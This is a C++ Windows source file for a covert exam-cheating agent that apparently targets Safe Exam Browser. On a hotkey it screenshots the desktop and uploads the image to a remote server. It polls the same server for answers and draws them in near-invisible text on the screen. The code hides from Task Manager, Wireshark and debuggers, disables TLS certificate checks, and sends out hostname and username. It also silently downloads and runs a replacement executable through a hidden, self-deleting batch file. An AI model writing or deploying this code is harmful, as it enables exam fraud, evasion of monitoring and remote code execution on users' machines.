#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif
#define STB_IMAGE_WRITE_IMPLEMENTATION
#include "src/stb_image_write.h"
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <vector>
#include <tlhelp32.h>
#include <thread>
#include <chrono>
#include <stdarg.h>
#include <stdio.h>
#include <fstream>

#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Gdi32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Wininet.lib")

// --- CONFIG ---
const char* HOST = "exam-system-v1.onrender.com";
const int   PORT = INTERNET_DEFAULT_HTTPS_PORT;
const char* SECRET_KEY = "super-secret-key";
const char* VERSION = "1.0.1";

// --- GLOBALS ---
char            g_activeDeskName[256] = "";
volatile int    g_currentUser = 1;
std::string     g_answerText = "";

enum DotState { DOT_RED, DOT_YELLOW, DOT_GREEN };
volatile DotState g_dotState = DOT_RED;
volatile bool g_agentEnabled = false;
volatile bool g_suspiciousProcessFound = false;

void Log(const char* format, ...) {
    // Logging disabled
}

// -------------------------------------------------------------
// Stealth & Anti-Analysis
// -------------------------------------------------------------
bool IsSuspiciousProcessRunning() {
    const char* badProcs[] = {
        "taskmgr.exe", "processhacker.exe", "procmon.exe", 
        "wireshark.exe", "x64dbg.exe", "ollydbg.exe", "pestudio.exe"
    };
    
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32A pe;
    pe.dwSize = sizeof(pe);
    bool found = false;

    if (Process32FirstA(hSnap, &pe)) {
        do {
            for (const char* bad : badProcs) {
                if (_stricmp(pe.szExeFile, bad) == 0) {
                    found = true;
                    break;
                }
            }
        } while (!found && Process32NextA(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return found;
}

// -------------------------------------------------------------
// System Info
// -------------------------------------------------------------
std::string GetComputerNameStr() {
    char buf[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(buf);
    if (GetComputerNameA(buf, &size)) return std::string(buf);
    return "Unknown";
}

std::string GetUserNameStr() {
    char buf[256];
    DWORD size = sizeof(buf);
    if (GetUserNameA(buf, &size)) return std::string(buf);
    return "Unknown";
}

std::string GetOSVersion() {
    OSVERSIONINFOEXA osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
    if (GetVersionExA((OSVERSIONINFOA*)&osvi)) {
        char buf[64];
        sprintf(buf, "%lu.%lu (Build %lu)", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
        return std::string(buf);
    }
    return "Windows";
}

// -------------------------------------------------------------
// HTTP Utilities
// -------------------------------------------------------------
std::string HttpGetPoll(int user_id) {
    HINTERNET hSession = InternetOpenA("SEB-Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) return "";

    DWORD timeout = 8000;
    InternetSetOptionA(hSession, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hSession, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hSession, INTERNET_OPTION_SEND_TIMEOUT,    &timeout, sizeof(timeout));

    HINTERNET hConnect = InternetConnectA(hSession, HOST, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hSession); return ""; }

    char path[256];
    sprintf(path, "/agent_poll?user_id=%d&secret=%s", user_id, SECRET_KEY);

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", path, NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hSession); return ""; }

    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

    std::string response = "";
    if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
        char buf[1024];
        DWORD bytesRead = 0;
        while (InternetReadFile(hRequest, buf, sizeof(buf) - 1, &bytesRead) && bytesRead > 0) {
            buf[bytesRead] = '\0';
            response += buf;
        }
    }

    InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hSession);
    return response;
}

void SendTelemetry(int user_id) {
    HINTERNET hSession = InternetOpenA("SEB-Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) return;
    HINTERNET hConnect = InternetConnectA(hSession, HOST, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hSession); return; }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/agent_info", NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hSession); return; }

    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

    char headers[256];
    sprintf(headers, "Content-Type: application/json\r\nX-Secret: %s", SECRET_KEY);

    char body[2048];
    sprintf(body, "{\"user_id\":\"%d\", \"hostname\":\"%s\", \"username\":\"%s\", \"os_ver\":\"%s\", \"version\":\"%s\"}",
            user_id, GetComputerNameStr().c_str(), GetUserNameStr().c_str(), GetOSVersion().c_str(), VERSION);

    HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers), (LPVOID)body, (DWORD)strlen(body));

    InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hSession);
}

void ExecuteSelfUpdate(const std::string& downloadUrl) {
    char currentExe[MAX_PATH];
    GetModuleFileNameA(NULL, currentExe, MAX_PATH);
    std::string newExe = std::string(currentExe) + ".new";

    // 1. Download new version
    HINTERNET hSession = InternetOpenA("SEB-Updater", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hUrl = InternetOpenUrlA(hSession, downloadUrl.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE, 0);
    
    if (hUrl) {
        std::ofstream ofs(newExe, std::ios::binary);
        char buf[4096];
        DWORD read = 0;
        while (InternetReadFile(hUrl, buf, sizeof(buf), &read) && read > 0) {
            ofs.write(buf, read);
        }
        ofs.close();
        InternetCloseHandle(hUrl);
    }
    InternetCloseHandle(hSession);

    // 2. Create batch to swap and restart
    std::string batPath = std::string(currentExe) + ".update.bat";
    std::ofstream bat(batPath);
    bat << "@echo off\n";
    bat << "timeout /t 2 /nobreak > nul\n";
    bat << "del \"" << currentExe << "\"\n";
    bat << "move \"" << newExe << "\" \"" << currentExe << "\"\n";
    bat << "start \"\" \"" << currentExe << "\"\n";
    bat << "del \"%~f0\"\n";
    bat.close();

    // 3. Launch batch and DIE
    ShellExecuteA(NULL, "open", batPath.c_str(), NULL, NULL, SW_HIDE);
    exit(0);
}

void CheckForUpdates() {
    HINTERNET hSession = InternetOpenA("SEB-Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) return;
    HINTERNET hConnect = InternetConnectA(hSession, HOST, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hSession); return; }

    char path[128];
    sprintf(path, "/check_update?version=%s", VERSION);
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", path, NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    
    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

    if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
        char buf[1024];
        DWORD bytesRead = 0;
        std::string response = "";
        while (InternetReadFile(hRequest, buf, sizeof(buf) - 1, &bytesRead) && bytesRead > 0) {
            buf[bytesRead] = '\0';
            response += buf;
        }
        
        if (response.find("\"update_available\":true") != std::string::npos) {
            size_t pos = response.find("\"download_url\":\"");
            if (pos != std::string::npos) {
                size_t start = pos + 16;
                size_t end = response.find("\"", start);
                std::string url = response.substr(start, end - start);
                // Replace escaped slashes
                size_t s;
                while((s = url.find("\\/")) != std::string::npos) url.replace(s, 2, "/");
                ExecuteSelfUpdate(url);
            }
        }
    }

    InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hSession);
}

void UploadToCloud(const std::vector<uint8_t>& jpegData, int user_id) {
    HINTERNET hSession = InternetOpenA("SEB-Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) return;
    HINTERNET hConnect = InternetConnectA(hSession, HOST, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hSession); return; }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/upload", NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hSession); return; }

    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

    std::string boundary = "----FrogBoundary1337";
    std::string headers = "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n" +
                          "X-User-Id: " + std::to_string(user_id) + "\r\n" +
                          "X-Secret: " + SECRET_KEY + "\r\n";

    std::string bodyStart = "--" + boundary + "\r\n" +
                            "Content-Disposition: form-data; name=\"file\"; filename=\"screen.jpg\"\r\n" +
                            "Content-Type: image/jpeg\r\n\r\n";
    std::string bodyEnd = "\r\n--" + boundary + "--\r\n";

    std::vector<uint8_t> fullBody;
    fullBody.insert(fullBody.end(), bodyStart.begin(), bodyStart.end());
    fullBody.insert(fullBody.end(), jpegData.begin(), jpegData.end());
    fullBody.insert(fullBody.end(), bodyEnd.begin(), bodyEnd.end());

    HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)fullBody.data(), (DWORD)fullBody.size());

    InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hSession);
}

// -------------------------------------------------------------
// Capture
// -------------------------------------------------------------
void TakeScreenshotAndUpload(int user_id) {
    if (g_suspiciousProcessFound) return;

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HWND hDesktop = GetDesktopWindow();
    HDC hScreen = GetDC(hDesktop);
    HDC hMem = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, sw, sh);
    SelectObject(hMem, hBitmap);
    BitBlt(hMem, 0, 0, sw, sh, hScreen, 0, 0, SRCCOPY);

    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);
    BITMAPINFOHEADER bi = { sizeof(BITMAPINFOHEADER), bmp.bmWidth, bmp.bmHeight, 1, 32, BI_RGB, 0, 0, 0, 0, 0 };
    bi.biHeight = -bmp.bmHeight; 

    std::vector<uint8_t> pixels(bmp.bmWidth * bmp.bmHeight * 4);
    GetDIBits(hMem, hBitmap, 0, bmp.bmHeight, pixels.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    std::vector<uint8_t> jpegBuffer;
    auto write_func = [](void* context, void* data, int size) {
        std::vector<uint8_t>* buf = (std::vector<uint8_t>*)context;
        uint8_t* ptr = (uint8_t*)data;
        buf->insert(buf->end(), ptr, ptr + size);
    };
    stbi_write_jpg_to_func(write_func, &jpegBuffer, bmp.bmWidth, bmp.bmHeight, 4, pixels.data(), 80);

    UploadToCloud(jpegBuffer, user_id);

    DeleteObject(hBitmap);
    DeleteDC(hMem);
    ReleaseDC(hDesktop, hScreen);
}

// -------------------------------------------------------------
// Threads
// -------------------------------------------------------------
void PollingThreadFunc() {
    int teleCounter = 0;
    while (true) {
        // Anti-analysis check
        g_suspiciousProcessFound = IsSuspiciousProcessRunning();
        if (g_suspiciousProcessFound) {
            g_dotState = DOT_RED;
            g_agentEnabled = false;
            std::this_thread::sleep_for(std::chrono::milliseconds(2000));
            continue;
        }

        std::string resp = HttpGetPoll(g_currentUser);
        if (!resp.empty()) {
            if (resp.find("\"status\":\"disabled\"") != std::string::npos) {
                g_agentEnabled = false;
                g_dotState = DOT_RED;
            } else if (resp.find("\"status\":\"pending\"") != std::string::npos) {
                g_agentEnabled = true;
                if (g_dotState != DOT_YELLOW) g_dotState = DOT_RED;
            } else if (resp.find("\"status\":\"ready\"") != std::string::npos) {
                g_agentEnabled = true;
                g_dotState = DOT_GREEN;
                size_t pos = resp.find("\"text\":\"");
                if (pos != std::string::npos) {
                    size_t start = pos + 8;
                    size_t end = resp.find("\"", start);
                    g_answerText = resp.substr(start, end - start);
                }
            }
        }

        if (teleCounter % 60 == 0) { 
            SendTelemetry(g_currentUser);
            CheckForUpdates();
        }
        teleCounter++;
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }
}

struct ThreadParam { char desktopName[256]; };

DWORD WINAPI ActiveDesktopThreadProc(LPVOID lpParam) {
    ThreadParam* p = (ThreadParam*)lpParam;
    char targetDesktop[256];
    strcpy(targetDesktop, p->desktopName);
    delete p;

    HDESK hDesk = OpenDesktopA(targetDesktop, 0, FALSE, GENERIC_ALL);
    if (!hDesk) return 0;
    SetThreadDesktop(hDesk);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HFONT bigFont = CreateFontA(36, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, ANTIALIASED_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Arial");

    bool wasShowingText = false;
    int  cleanupFrames = 0;

    while (strcmp(g_activeDeskName, targetDesktop) == 0) {
        if (!g_agentEnabled || g_suspiciousProcessFound) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            continue;
        }

        bool ctrlHeld  = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
        bool shiftHeld = (GetAsyncKeyState(VK_SHIFT)   & 0x8000) != 0;
        int pressedNode = -1;

        if (ctrlHeld && shiftHeld) {
            for (int i = 0; i < 10; i++) {
                int key = (i == 9) ? '0' : ('1' + i);
                if (GetAsyncKeyState(key) & 0x8000) {
                    pressedNode = i + 1;
                    break;
                }
            }
        }

        if (pressedNode != -1) {
            g_currentUser = pressedNode;
            g_dotState = DOT_YELLOW;
            g_answerText = "";
            std::thread t(TakeScreenshotAndUpload, pressedNode);
            t.detach();
            while ((GetAsyncKeyState(VK_CONTROL) & 0x8000) || (GetAsyncKeyState(VK_SHIFT)   & 0x8000)) {
                std::this_thread::sleep_for(std::chrono::milliseconds(16));
            }
        }

        HDC hdc = GetDC(NULL);
        if (hdc) {
            bool shift2 = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
            bool rmbHeld = (GetAsyncKeyState(VK_RBUTTON) & 0x8000) != 0;
            bool showText = shift2 && rmbHeld && !g_answerText.empty();

            if (showText && !wasShowingText && g_dotState == DOT_GREEN) {
                g_dotState = DOT_RED;
            }

            if (!showText && wasShowingText) {
                cleanupFrames = 30; 
            }
            wasShowingText = showText;

            if (cleanupFrames > 0 && !showText) {
                InvalidateRect(NULL, NULL, TRUE);
                RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_UPDATENOW | RDW_ALLCHILDREN);
                cleanupFrames--;
            }

            if (showText) {
                SetTextColor(hdc, RGB(232, 232, 232));
                SetBkMode(hdc, OPAQUE);
                SetBkColor(hdc, RGB(240, 240, 240));
                HGDIOBJ oldFont = SelectObject(hdc, bigFont);

                SIZE sz;
                GetTextExtentPoint32A(hdc, g_answerText.c_str(), g_answerText.length(), &sz);
                int tx = (sw - sz.cx) / 2;
                int ty = sh - sz.cy - 4;
                TextOutA(hdc, tx, ty, g_answerText.c_str(), g_answerText.length());
                SelectObject(hdc, oldFont);
            } else {
                COLORREF dotColor;
                switch (g_dotState) {
                    case DOT_RED:    dotColor = RGB(220, 160, 160);  break;
                    case DOT_YELLOW: dotColor = RGB(225, 220, 160);  break;
                    case DOT_GREEN:  dotColor = RGB(160, 220, 160);  break;
                    default:         dotColor = RGB(220, 160, 160);  break;
                }
                HBRUSH dotBrush = CreateSolidBrush(dotColor);
                HGDIOBJ oldPen = SelectObject(hdc, GetStockObject(NULL_PEN));
                HGDIOBJ oldBrush = SelectObject(hdc, dotBrush);
                Ellipse(hdc, sw - 10, sh - 10, sw - 6, sh - 6);
                SelectObject(hdc, oldBrush);
                SelectObject(hdc, oldPen);
                DeleteObject(dotBrush);
            }
            ReleaseDC(NULL, hdc);
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(16));
    }
    CloseDesktop(hDesk);
    return 0;
}

DWORD WINAPI MonitorThreadProc(LPVOID lpParam) {
    while (true) {
        HWINSTA hWinSta = OpenWindowStationA("WinSta0", FALSE, GENERIC_ALL);
        if (hWinSta) {
            SetProcessWindowStation(hWinSta);
            HDESK hDesk = OpenInputDesktop(0, FALSE, GENERIC_ALL);
            if (hDesk) {
                char name[256];
                DWORD needed = 0;
                if (GetUserObjectInformationA(hDesk, UOI_NAME, name, sizeof(name), &needed)) {
                    if (strcmp(name, g_activeDeskName) != 0) {
                        strcpy(g_activeDeskName, name);
                        ThreadParam* p = new ThreadParam();
                        strcpy(p->desktopName, name);
                        HANDLE hThread = CreateThread(NULL, 0, ActiveDesktopThreadProc, p, 0, NULL);
                        if (hThread) CloseHandle(hThread);
                    }
                }
                CloseDesktop(hDesk);
            }
            CloseWindowStation(hWinSta);
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    SetProcessDPIAware();
    std::thread poller(PollingThreadFunc);
    poller.detach();
    HANDLE hMon = CreateThread(NULL, 0, MonitorThreadProc, NULL, 0, NULL);
    if (hMon) CloseHandle(hMon);
    while (true) { std::this_thread::sleep_for(std::chrono::milliseconds(1000)); }
    return 0;
}
